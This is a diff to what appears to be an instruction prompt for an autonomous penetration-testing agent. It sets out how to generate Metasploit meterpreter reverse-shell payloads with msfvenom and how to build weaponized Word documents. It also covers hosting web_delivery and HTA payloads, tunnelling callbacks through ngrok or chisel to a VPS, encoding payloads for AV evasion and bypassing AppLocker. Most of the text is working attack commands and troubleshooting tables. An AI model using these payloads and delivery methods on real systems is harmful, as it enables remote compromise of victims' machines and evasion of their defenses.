@@ -82,10 +82,10 @@ kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /t
 **Payload + Format Selection Matrix:**
 
 **CRITICAL — CHECK "Pre-Configured Payload Settings" ABOVE BEFORE CHOOSING A PAYLOAD!**
-**If ngrok is ACTIVE, you MUST use the STAGELESS column (underscore `_`) instead of the default STAGED column (slash `/`).**
-**Staged payloads SILENTLY FAIL through ngrok — the stage transfer gets corrupted and the session dies instantly.**
+**If ngrok or chisel is ACTIVE, you MUST use the STAGELESS column (underscore `_`). Staged payloads FAIL through tunnels — sessions die instantly in a loop.**
+**Only use staged payloads with direct connections (no tunnel).**
 
-| Target OS | Payload (STAGED — no ngrok) | Payload (STAGELESS — ngrok/tunnel) | Format (`-f`) | Output File | Notes |
+| Target OS | Payload (STAGED) | Payload (STAGELESS) | Format (`-f`) | Output File | Notes |
 |-----------|-----------------------------|------------------------------------|---------------|-------------|-------|
 | Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common Windows payload |
 | Windows | `windows/meterpreter/reverse_https` | `windows/meterpreter_reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
@@ -104,8 +104,9 @@ kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /t
 | Multi | `python/meterpreter/reverse_tcp` | `python/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.py` | Python (cross-platform) |
 
 **How to tell staged vs stageless apart:**
-- STAGED: `meterpreter/reverse_tcp` (slash `/` = two-stage delivery, BREAKS through ngrok)
-- STAGELESS: `meterpreter_reverse_tcp` (underscore `_` = single binary, WORKS through ngrok)
+- STAGED: `meterpreter/reverse_tcp` (slash `/` = two-stage delivery, BREAKS through any tunnel — ngrok or chisel)
+- STAGELESS: `meterpreter_reverse_tcp` (underscore `_` = single binary, WORKS through any tunnel)
+- **If using ngrok or chisel: you MUST use STAGELESS.** Only direct connections support staged payloads.
 - The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure
 
 **Encoding for AV evasion (optional):**
@@ -124,8 +125,8 @@ kali_shell: "ls -la /tmp/payload.exe && file /tmp/payload.exe"
 
 Use Metasploit fileformat modules to generate weaponized documents.
 
-**ngrok note:** If ngrok is active (check "Pre-Configured Payload Settings" above), replace
-`windows/meterpreter/reverse_tcp` with `windows/meterpreter_reverse_tcp` in ALL commands below.
+**Tunnel note:** If ngrok or chisel is active, replace staged (`/`) with stageless (`_`) payloads.
+Staged payloads only work with direct connections (no tunnel).
 
 **B1: Word Document with VBA Macro**
 ```
@@ -166,16 +167,15 @@ kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
 
 Host a payload on a web server and generate a one-liner for the target to execute.
 
-**⚠ NGROK / SINGLE-TUNNEL LIMITATION:**
+**⚠ TUNNEL COMPATIBILITY:**
 Web delivery requires TWO open ports reachable by the victim:
 1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
 2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback
 
-If ngrok (or any single tunnel) is active, it only forwards ONE port (LPORT for the reverse handler).
-The victim CANNOT reach SRVPORT through that same tunnel, so the payload download silently fails and no session is created.
-
-**→ If using ngrok / single tunnel: DO NOT use web_delivery. Use Method A (msfvenom standalone payload) instead.**
-**→ Web delivery only works when the victim can directly reach BOTH ports** (same LAN, VPN, or multiple tunnels).
+**→ If using ngrok (single tunnel): DO NOT use web_delivery.** ngrok only forwards ONE port (LPORT). Use Method A instead.
+**→ If using chisel tunnel: web delivery WORKS!** Chisel tunnels BOTH SRVPORT (8080) and LPORT (4444).
+   Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`. The victim downloads from `http://<VPS>:8080/...`.
+**→ If on the same LAN as the target: web delivery works** (both ports directly reachable).
 
 ```
 use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
@@ -202,9 +202,11 @@ The web_delivery server runs as a background job until the target executes the o
 
 Host an HTA (HTML Application) that executes a payload when opened in a browser.
 
-**⚠ Same NGROK / SINGLE-TUNNEL LIMITATION as Method C:**
+**⚠ Same TUNNEL COMPATIBILITY as Method C:**
 HTA delivery also requires two reachable ports (SRVPORT for the HTA download + LPORT for the reverse callback).
-**→ If using ngrok / single tunnel: DO NOT use HTA delivery. Use Method A (msfvenom standalone payload) instead.**
+**→ If using ngrok (single tunnel): DO NOT use HTA delivery.** Use Method A instead.
+**→ If using chisel tunnel: HTA delivery WORKS!** Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`.
+**→ If on the same LAN: HTA delivery works.**
 
 ```
 use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
@@ -257,13 +259,15 @@ Report the one-liner command (Method C) or URL (Method D) to the user.
 |---------|-----|
 | msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
 | Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
-| Handler dies immediately | Check LHOST is correct. If using ngrok, ensure `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort 4444` are set. |
-| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok, verify you are using a STAGELESS payload (underscore `_` not slash `/`). |
-| Session opens then dies instantly (ngrok) | You are using a STAGED payload — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). |
+| Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, ensure `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort 4444` are set. |
+| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in kali-sandbox. |
+| Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads only work with direct connections. |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
-| Web delivery: victim runs one-liner but no session (ngrok) | Web delivery CANNOT work through a single ngrok tunnel — it needs TWO ports (SRVPORT for download + LPORT for callback). Switch to Method A (msfvenom standalone payload) which only needs one tunnel for LPORT. |
-| HTA delivery: victim visits URL but no session (ngrok) | Same as web delivery — HTA server needs SRVPORT reachable too. Use Method A instead. |
+| Web delivery: no session (ngrok) | Web delivery CANNOT work through ngrok (needs TWO ports). Switch to Method A or use chisel tunnel instead. |
+| Web delivery: no session (chisel) | Verify chisel is tunneling port 8080. Check `SRVHOST 0.0.0.0` and `SRVPORT 8080`. Verify the one-liner URL uses the VPS hostname. Check `/var/log/chisel.log`. |
+| HTA delivery: no session (ngrok) | Same as web delivery — HTA needs SRVPORT reachable. Use Method A or chisel. |
+| HTA delivery: no session (chisel) | Verify chisel tunnels port 8080. Check SRVHOST/SRVPORT settings and chisel logs. |
 | No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
 """
